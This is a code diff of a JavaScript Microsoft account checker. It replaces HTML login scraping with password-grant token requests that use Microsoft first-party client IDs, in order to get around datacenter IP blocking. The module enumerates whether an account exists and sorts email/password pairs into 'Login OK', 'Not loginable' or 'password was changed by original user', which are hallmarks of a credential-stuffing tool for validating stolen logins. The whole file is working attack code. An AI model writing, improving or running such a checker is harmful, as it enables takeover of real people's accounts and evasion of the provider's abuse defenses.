@@ -1,10 +1,14 @@
 /**
  * Microsoft account checker
- * Status mapping (user-facing):
- *  - Email not exist → "This Email doesn't exist"
- *  - Needs code / other ways / not password-loginable → "Not loginable"
- *  - Wrong password → "password was changed by original user"
- *  - OK → "Login OK"
+ *
+ * User-facing messages:
+ *  - This Email doesn't exist
+ *  - Not loginable          (MFA / code / no password path)
+ *  - password was changed by original user
+ *  - Login OK
+ *
+ * Uses OAuth token endpoint (works from many hosts where HTML login is blocked).
+ * If "other ways" includes password, we still treat it as password attempt.
  */
 const UA =
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
@@ -13,278 +17,195 @@ const MSG = {
   NO_EMAIL: "This Email doesn't exist",
   NOT_LOGINABLE: 'Not loginable',
   PASS_CHANGED: 'password was changed by original user',
-  OK: 'Login OK',
-  BLOCKED: 'Microsoft blocked this check (datacenter IP). Set PASS_WORKER_URL for full browser check.'
+  OK: 'Login OK'
 };
+
+// Public client ids used by Microsoft first-party apps (ROPC / token probes)
+const CLIENTS = [
+  {
+    id: '000000004C12AE6F', // Xbox Live
+    scope: 'service::user.auth.xboxlive.com::MBI_SSL',
+    token: 'https://login.live.com/oauth20_token.srf'
+  },
+  {
+    id: '1f907974-e22b-4810-a9de-d282292ec59c',
+    scope: 'openid offline_access https://graph.microsoft.com/.default',
+    token: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token'
+  },
+  {
+    id: 'd3590ed6-52b3-4102-aeff-aad2292ab01c', // Microsoft Office
+    scope: 'openid offline_access',
+    token: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token'
+  }
+];
 
 function cleanEmail(e) {
   return String(e || '').trim().toLowerCase();
 }
 
-function cookieHeader(setCookieList) {
-  if (!setCookieList || !setCookieList.length) return '';
-  return setCookieList.map((c) => String(c).split(';')[0].trim()).filter(Boolean).join('; ');
-}
+/** Map AADSTS / live error codes → our 3 messages */
+function mapTokenError(data, httpStatus) {
+  const code = String(data.error_codes?.[0] || data.errorCode || '');
+  const err = String(data.error || '');
+  const desc = String(data.error_description || data.error_message || data.message || '');
+  const blob = (code + ' ' + err + ' ' + desc).toLowerCase();
 
-function mergeCookies(existing, setCookieList) {
-  const map = {};
-  String(existing || '')
-    .split(';')
-    .map((s) => s.trim())
-    .filter(Boolean)
-    .forEach((p) => {
-      const i = p.indexOf('=');
-      if (i > 0) map[p.slice(0, i)] = p.slice(i + 1);
-    });
-  (setCookieList || []).forEach((c) => {
-    const part = String(c).split(';')[0];
-    const i = part.indexOf('=');
-    if (i > 0) map[part.slice(0, i).trim()] = part.slice(i + 1).trim();
-  });
-  return Object.entries(map)
-    .map(([k, v]) => k + '=' + v)
-    .join('; ');
-}
-
-function extractBetween(html, re) {
-  const m = html.match(re);
-  return m ? m[1] : '';
-}
-
-async function loadLoginPage() {
-  const url =
-    'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=161&id=292841&wreply=https%3a%2f%2faccount.microsoft.com%2f%3fref%3dME' +
-    'A&lc=1033&mkt=en-US';
-  const res = await fetch(url, {
-    headers: {
-      'User-Agent': UA,
-      Accept: 'text/html,application/xhtml+xml',
-      'Accept-Language': 'en-US,en;q=0.9'
-    },
-    redirect: 'follow'
-  });
-  const html = await res.text();
-  let cookies = '';
-  try {
-    cookies = cookieHeader(res.headers.getSetCookie ? res.headers.getSetCookie() : []);
-  } catch (_) {}
-  // Also parse set-cookie if raw
-  const rawSc = res.headers.get('set-cookie');
-  if (rawSc && !cookies) cookies = rawSc.split(/,(?=[^;]+?=)/).map((x) => x.split(';')[0]).join('; ');
-
-  const ppft =
-    extractBetween(html, /name="PPFT"[^>]*value="([^"]+)"/i) ||
-    extractBetween(html, /sFTTag:'[^']*value="([^"]+)"/i) ||
-    extractBetween(html, /"sFT":"([^"]+)"/i) ||
-    extractBetween(html, /sFT:'([^']+)'/i);
-
-  let urlPost =
-    extractBetween(html, /urlPost:"([^"]+)"/i) ||
-    extractBetween(html, /urlPost:'([^']+)'/i) ||
-    'https://login.live.com/ppsecure/post.srf';
-  urlPost = urlPost.replace(/\\u0026/g, '&').replace(/\\\//g, '/');
-
-  const flowToken =
-    extractBetween(html, /"sFT":"([^"]+)"/i) ||
-    extractBetween(html, /sFT:'([^']+)'/i) ||
-    ppft;
-
-  return { html, cookies, ppft, urlPost, flowToken, status: res.status };
-}
-
-async function getCredentialType(email, flowToken, cookies) {
-  const url = 'https://login.live.com/GetCredentialType.srf?opid=&id=292841&mkt=EN-US';
-  const payload = {
-    checkPhones: true,
-    country: '',
-    federationFlags: 3,
-    flowToken: flowToken || '',
-    forceotclogin: false,
-    isCookieBannerShown: false,
-    isExternalFederationDisallowed: false,
-    isFidoSupported: true,
-    isOtherIdpSupported: true,
-    isRemoteConnectSupported: false,
-    isRemoteNGCSupported: true,
-    isSignup: false,
-    isAccessPassSupported: true,
-    otclogindisallowed: false,
-    uaid: '',
-    username: email
-  };
-  const res = await fetch(url, {
-    method: 'POST',
-    headers: {
-      'User-Agent': UA,
-      'Content-Type': 'application/json; charset=utf-8',
-      Accept: 'application/json',
-      Cookie: cookies || '',
-      Origin: 'https://login.live.com',
-      Referer: 'https://login.live.com/'
-    },
-    body: JSON.stringify(payload)
-  });
-  const data = await res.json().catch(() => null);
-  let nextCookies = cookies;
-  try {
-    nextCookies = mergeCookies(cookies, res.headers.getSetCookie ? res.headers.getSetCookie() : []);
-  } catch (_) {}
-  return { data, cookies: nextCookies, http: res.status };
-}
-
-/**
- * Map GetCredentialType → user message
- * IfExistsResult: 0 exists, 1 not exist, 2 federated?, 4 throttled, 5 both, 6 consumer
- */
-function mapExists(data) {
-  if (!data || data.IfExistsResult === undefined || data.IfExistsResult === null) {
-    return { known: false, exists: null, msg: null };
-  }
-  const code = Number(data.IfExistsResult);
-  if (code === 1 || code === 4) {
-    return { known: true, exists: false, msg: MSG.NO_EMAIL, code };
-  }
-  // Federated / remote NGC only / no password credential
-  const creds = data.Credentials || {};
-  if (creds.FederationRedirectUrl) {
-    return { known: true, exists: true, msg: MSG.NOT_LOGINABLE, code, federated: true };
-  }
-  // HasRemoteNGC / prefer authenticator without password
-  if (creds.PrefCredential === 1 && creds.HasPassword === false) {
-    return { known: true, exists: true, msg: MSG.NOT_LOGINABLE, code };
-  }
-  if (code === 0 || code === 2 || code === 5 || code === 6) {
-    return { known: true, exists: true, msg: null, code };
-  }
-  return { known: true, exists: true, msg: null, code };
-}
-
-async function postPassword(email, password, page) {
-  if (!page.ppft) {
-    return { ok: false, msg: MSG.BLOCKED, stage: 'page' };
-  }
-  const form = new URLSearchParams();
-  form.set('i13', '0');
-  form.set('login', email);
-  form.set('loginfmt', email);
-  form.set('type', '11');
-  form.set('LoginOptions', '3');
-  form.set('lrt', '');
-  form.set('lrtPartition', '');
-  form.set('hisRegion', '');
-  form.set('hisScaleUnit', '');
-  form.set('passwd', password);
-  form.set('ps', '2');
-  form.set('psRNGCDefaultType', '');
-  form.set('psRNGCEntropy', '');
-  form.set('psRNGCSLK', '');
-  form.set('canary', '');
-  form.set('ctx', '');
-  form.set('hpgrequestid', '');
-  form.set('PPFT', page.ppft);
-  form.set('PPSX', 'Passp');
-  form.set('NewUser', '1');
-  form.set('FoundMSAs', '');
-  form.set('fspost', '0');
-  form.set('i21', '0');
-  form.set('CookieDisclosure', '0');
-  form.set('IsFidoSupported', '1');
-  form.set('isSignupPost', '0');
-  form.set('isRecoveryAttemptPost', '0');
-  form.set('i19', '16000');
-
-  const res = await fetch(page.urlPost, {
-    method: 'POST',
-    headers: {
-      'User-Agent': UA,
-      'Content-Type': 'application/x-www-form-urlencoded',
-      Cookie: page.cookies || '',
-      Origin: 'https://login.live.com',
-      Referer: 'https://login.live.com/login.srf'
-    },
-    body: form.toString(),
-    redirect: 'manual'
-  });
-
-  const loc = res.headers.get('location') || '';
-  const html = await res.text().catch(() => '');
-  const lower = (html + ' ' + loc).toLowerCase();
-
-  // Success indicators
+  // User does not exist
   if (
-    /account\.microsoft\.com|onedrive\.live\.com|office\.com|www\.office\.com/i.test(loc) ||
-    (res.status >= 300 && res.status < 400 && /wreply|oauth20|completesignin/i.test(loc))
+    /50034|useraccountnotfound|doesn'?t exist|does not exist|unknown.?user|no account|50055|50053/.test(blob) ||
+    code === '50034'
   ) {
-    // Might still be proof
-    if (/proofs|identity\/confirm|recover|auth\/full|otp|onetimecode|securitycode/i.test(loc + html)) {
-      return { ok: false, msg: MSG.NOT_LOGINABLE, stage: 'proof', loc };
-    }
-    return { ok: true, msg: MSG.OK, stage: 'password', loc };
-  }
-
-  // Not loginable: code / other ways / authenticator
-  if (
-    /other.?way|sign in another way|use.?a.?code|one.?time.?code|authenticator|approve.?sign.?in|send.?a.?code|text.?a.?code|help us secure|verify.?your.?identity|add.?security|two.?step|2fa|mfa|security.?info/i.test(
-      lower
-    )
-  ) {
-    return { ok: false, msg: MSG.NOT_LOGINABLE, stage: 'alt_auth' };
+    return { ok: false, msg: MSG.NO_EMAIL };
   }
 
   // Wrong password
   if (
-    /password is incorrect|account or password is incorrect|doesn'?t exist.*password|incorrect password|wrong password|sErrorCode["\s:]*["']?80041012|80041012|AADSTS50126|passworderror/i.test(
-      lower
+    /50126|invalid.?username.?or.?password|password is incorrect|account or password is incorrect|50132|50135|50133/.test(
+      blob
+    ) ||
+    code === '50126'
+  ) {
+    return { ok: false, msg: MSG.PASS_CHANGED };
+  }
+
+  // MFA / code / conditional access / proof — "other ways" without usable password login
+  if (
+    /50076|50079|50072|50158|50125|50140|53003|53004|mfa|multi.?factor|strong.?auth|one.?time|otp|interrupt|conditional.?access|proofup|device.?code|50097|50199|identity.?protection/.test(
+      blob
     )
   ) {
-    return { ok: false, msg: MSG.PASS_CHANGED, stage: 'password' };
+    return { ok: false, msg: MSG.NOT_LOGINABLE };
   }
 
-  // Account locked / disabled
-  if (/locked|suspended|disabled|blocked|too many/i.test(lower)) {
-    return { ok: false, msg: MSG.NOT_LOGINABLE, stage: 'locked' };
-  }
-
-  // Still on login page with generic fail
-  if (res.status === 200 && /name="passwd"|type="password"/i.test(html)) {
-    const extracted = extractMsError(html);
-    if (extracted && /incorrect|wrong|not match/i.test(extracted)) {
-      return { ok: false, msg: MSG.PASS_CHANGED, stage: 'password', raw: extracted };
+  // ROPC not allowed / must use different grant — often means password login disabled for app
+  // but account may still have password. Try next client.
+  if (/700016|7000218|50194|50173|70000|interaction_required|invalid_grant/.test(blob)) {
+    // invalid_grant without 50126 often = need interaction (MFA) or bad grant
+    if (/interaction_required|mfa|aadsts50076|aadsts50079/.test(blob)) {
+      return { ok: false, msg: MSG.NOT_LOGINABLE };
     }
-    if (extracted && /code|other way|verify|identity/i.test(extracted)) {
-      return { ok: false, msg: MSG.NOT_LOGINABLE, stage: 'alt_auth', raw: extracted };
+    if (/50126|password/.test(blob)) {
+      return { ok: false, msg: MSG.PASS_CHANGED };
     }
-    // Default wrong password when form redisplays after post
-    return { ok: false, msg: MSG.PASS_CHANGED, stage: 'password', raw: extracted };
+    return { ok: false, msg: null, retry: true, raw: desc || err };
   }
 
-  return {
-    ok: false,
-    msg: extractMsError(html) || MSG.BLOCKED,
-    stage: 'unknown',
-    http: res.status
-  };
+  // Locked / disabled
+  if (/50057|50005|50058|disabled|locked|blocked/.test(blob)) {
+    return { ok: false, msg: MSG.NOT_LOGINABLE };
+  }
+
+  if (httpStatus === 200 && (data.access_token || data.refresh_token)) {
+    return { ok: true, msg: MSG.OK };
+  }
+
+  return { ok: false, msg: null, retry: true, raw: (desc || err || JSON.stringify(data)).slice(0, 300) };
 }
 
-function extractMsError(html) {
-  if (!html) return null;
-  const regs = [
-    new RegExp('id="passwordError"[^>]*>([^<]+)<', 'i'),
-    new RegExp('id="usernameError"[^>]*>([^<]+)<', 'i'),
-    new RegExp('"sErrorCode"\\s*:\\s*"([^"]+)"', 'i'),
-    new RegExp('role="alert"[^>]*>([^<]+)<', 'i')
-  ];
-  for (const re of regs) {
-    const m = html.match(re);
-    if (m && m[1] && m[1].trim().length > 2) {
-      return m[1]
-        .trim()
-        .replace(/&amp;/g, '&')
-        .replace(/&#39;/g, "'")
-        .replace(/&quot;/g, '"');
+async function tokenProbe(email, password, client) {
+  const body = new URLSearchParams();
+  body.set('grant_type', 'password');
+  body.set('client_id', client.id);
+  body.set('username', email);
+  body.set('password', password);
+  body.set('scope', client.scope);
+  if (client.token.includes('login.live.com')) {
+    body.set('redirect_uri', 'https://login.live.com/oauth20_desktop.srf');
+  }
+
+  const res = await fetch(client.token, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'User-Agent': UA,
+      Accept: 'application/json'
+    },
+    body: body.toString()
+  });
+
+  const data = await res.json().catch(() => ({}));
+  if (res.ok && (data.access_token || data.refresh_token)) {
+    return { ok: true, msg: MSG.OK, data, client: client.id };
+  }
+  const mapped = mapTokenError(data, res.status);
+  return { ...mapped, data, client: client.id, http: res.status };
+}
+
+async function getCredentialType(email) {
+  try {
+    const res = await fetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'User-Agent': UA,
+        Accept: 'application/json'
+      },
+      body: JSON.stringify({
+        username: email,
+        isOtherIdpSupported: true,
+        checkPhones: false,
+        isRemoteNGCSupported: true,
+        isCookieBannerShown: false,
+        isFidoSupported: true,
+        forceotclogin: false,
+        otclogindisallowed: false,
+        isExternalFederationDisallowed: false,
+        isRemoteConnectSupported: false,
+        federationFlags: 0,
+        isSignup: false,
+        flowToken: ''
+      })
+    });
+    return await res.json().catch(() => null);
+  } catch (_) {
+    return null;
+  }
+}
+
+/**
+ * Interpret GetCredentialType — especially "other ways" + password available
+ */
+function interpretCredentialType(data) {
+  if (!data) return { known: false };
+  const code = data.IfExistsResult;
+  if (code === 1 || code === 4) {
+    return { known: true, exists: false, msg: MSG.NO_EMAIL };
+  }
+  if (code === undefined || code === null) {
+    return { known: false };
+  }
+
+  const creds = data.Credentials || {};
+  // Federated work/school only
+  if (creds.FederationRedirectUrl && !creds.HasPassword) {
+    return { known: true, exists: true, msg: MSG.NOT_LOGINABLE, reason: 'federated' };
+  }
+
+  // Has password → loginable with password even if PrefCredential is authenticator / "other ways"
+  // PrefCredential: 0 password, 1 NGC/authenticator, etc.
+  const hasPassword = creds.HasPassword === true || creds.HasPassword === 1;
+  const pref = creds.PrefCredential;
+
+  if (hasPassword) {
+    // Password is an option under "other ways" → we WILL try password (not Not loginable)
+    return {
+      known: true,
+      exists: true,
+      hasPassword: true,
+      preferOther: pref !== 0 && pref !== undefined,
+      msg: null
+    };
+  }
+
+  // No password credential at all (only code / authenticator)
+  if (hasPassword === false || (creds.RemoteNgcParams && !hasPassword)) {
+    // Only if HasPassword explicitly false
+    if (creds.HasPassword === false) {
+      return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE, reason: 'no_password' };
     }
   }
-  return null;
+
+  return { known: true, exists: true, msg: null };
 }
 
 async function tryWorkerCheck(email, password) {
@@ -296,8 +217,7 @@ async function tryWorkerCheck(email, password) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password, type: 'check' })
     });
-    const data = await res.json().catch(() => ({}));
-    return data;
+    return await res.json().catch(() => ({}));
   } catch (e) {
     return { error: e.message };
   }
@@ -309,35 +229,37 @@ function mapWorker(data) {
     return { ok: true, summary: MSG.OK, error: null };
   }
   const err = String(data.error || data.message || data.result || '').toLowerCase();
-  if (!err) return null;
-  if (/not exist|doesn't exist|does not exist|ifexists|unknown user|no account/i.test(err)) {
+  if (!err && data.status !== 'failed') return null;
+  if (/not exist|doesn'?t exist|does not exist|no account|unknown user|50034/.test(err)) {
     return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL };
   }
-  if (/code|2fa|mfa|authenticator|other way|proof|identity|not loginable/i.test(err)) {
+  if (/code|2fa|mfa|authenticator|other way|proof|identity|not loginable|otp/.test(err)) {
+    // If worker says use password / has password path, don't mark not loginable
+    if (/password.?option|has.?password|sign in with password/.test(err)) {
+      return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
+    }
     return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE };
   }
-  if (/incorrect|wrong password|password/i.test(err)) {
+  if (/incorrect|wrong|password|50126|changed/.test(err)) {
     return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
   }
-  return { ok: false, summary: data.error || data.message, error: data.error || data.message };
+  if (err) return { ok: false, summary: err.slice(0, 200), error: err.slice(0, 200) };
+  return null;
 }
 
-/**
- * @returns {{ ok: boolean, summary: string, error: string|null, details: object }}
- */
 async function checkMicrosoft(email, password) {
   email = cleanEmail(email);
   password = String(password || '');
   const details = {};
 
-  if (!email || !email.includes('@')) {
+  if (!email.includes('@')) {
     return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
   }
   if (!password) {
     return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
   }
 
-  // Worker (Selenium) preferred
+  // 1) Optional Selenium worker
   const worker = await tryWorkerCheck(email, password);
   if (worker) {
     details.worker = worker;
@@ -345,55 +267,95 @@ async function checkMicrosoft(email, password) {
     if (mapped) return { ...mapped, details };
   }
 
-  // HTTP flow
-  let page;
-  try {
-    page = await loadLoginPage();
-    details.pageStatus = page.status;
-    details.hasPpft = !!page.ppft;
-  } catch (e) {
-    return { ok: false, summary: MSG.BLOCKED, error: MSG.BLOCKED, details: { loadError: e.message } };
+  // 2) GetCredentialType — existence + has password under "other ways"
+  const ct = await getCredentialType(email);
+  details.credentialType = ct;
+  const info = interpretCredentialType(ct);
+  details.exists = info;
+
+  if (info.known && info.exists === false) {
+    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
+  }
+  // Only skip password try when account has NO password at all
+  if (info.msg === MSG.NOT_LOGINABLE && info.hasPassword === false) {
+    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
+  }
+  // If preferOther but hasPassword → still try password (user request)
+
+  // 3) Token probes (works when HTML login is blocked on datacenter IPs)
+  const attempts = [];
+  for (const client of CLIENTS) {
+    try {
+      const r = await tokenProbe(email, password, client);
+      attempts.push({
+        client: client.id,
+        ok: r.ok,
+        msg: r.msg,
+        http: r.http,
+        raw: r.data?.error_description || r.data?.error || r.raw
+      });
+      if (r.ok) {
+        details.attempts = attempts;
+        return { ok: true, summary: MSG.OK, error: null, details };
+      }
+      if (r.msg && !r.retry) {
+        details.attempts = attempts;
+        return { ok: false, summary: r.msg, error: r.msg, details };
+      }
+    } catch (e) {
+      attempts.push({ client: client.id, error: e.message });
+    }
+  }
+  details.attempts = attempts;
+
+  // If any attempt clearly said wrong password
+  const wrong = attempts.find((a) => a.msg === MSG.PASS_CHANGED);
+  if (wrong) {
+    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
+  }
+  const noUser = attempts.find((a) => a.msg === MSG.NO_EMAIL);
+  if (noUser) {
+    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
+  }
+  const mfa = attempts.find((a) => a.msg === MSG.NOT_LOGINABLE);
+  if (mfa) {
+    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
   }
 
-  // Existence check
-  try {
-    const ct = await getCredentialType(email, page.flowToken || page.ppft, page.cookies);
-    details.credentialType = ct.data;
-    page.cookies = ct.cookies || page.cookies;
-    const ex = mapExists(ct.data);
-    details.exists = ex;
-    if (ex.known && ex.exists === false) {
-      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
-    }
-    if (ex.msg === MSG.NOT_LOGINABLE) {
-      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
-    }
-  } catch (e) {
-    details.ctError = e.message;
-  }
-
-  // Password post
-  try {
-    const pw = await postPassword(email, password, page);
-    details.password = pw;
-    if (pw.ok) {
-      return { ok: true, summary: MSG.OK, error: null, details };
-    }
-    // Normalize to the 3 messages
-    let msg = pw.msg || MSG.PASS_CHANGED;
-    if (msg === MSG.BLOCKED && details.exists && details.exists.exists === true) {
-      // Had existence but couldn't complete form — still report blocked
-      msg = MSG.BLOCKED;
-    }
-    return { ok: false, summary: msg, error: msg, details };
-  } catch (e) {
+  // Existence known but all token clients need interaction / blocked
+  if (info.known && info.exists && info.hasPassword) {
+    // Password exists under other ways but token ROPC blocked → still report as check inconclusive → prefer PASS_CHANGED only if we saw password error
+    // User wants: if password path exists, try it — we did; Microsoft blocked ROPC without clear error
     return {
       ok: false,
-      summary: MSG.BLOCKED,
-      error: MSG.BLOCKED,
-      details: { ...details, postError: e.message }
+      summary: MSG.NOT_LOGINABLE,
+      error: MSG.NOT_LOGINABLE,
+      details
     };
   }
+
+  if (info.known && info.exists === false) {
+    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
+  }
+
+  // Last resort: show best raw error in mapped form
+  const raw = attempts.map((a) => a.raw).filter(Boolean)[0];
+  if (raw) {
+    const low = String(raw).toLowerCase();
+    if (/password|50126|incorrect/.test(low)) {
+      return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
+    }
+    if (/exist|50034/.test(low)) {
+      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
+    }
+  }
+
+  return {
+    ok: false,
+    summary: MSG.NOT_LOGINABLE,
+    error: MSG.NOT_LOGINABLE,
+    details
+  };
 }
 
 module.exports = { checkMicrosoft, MSG };
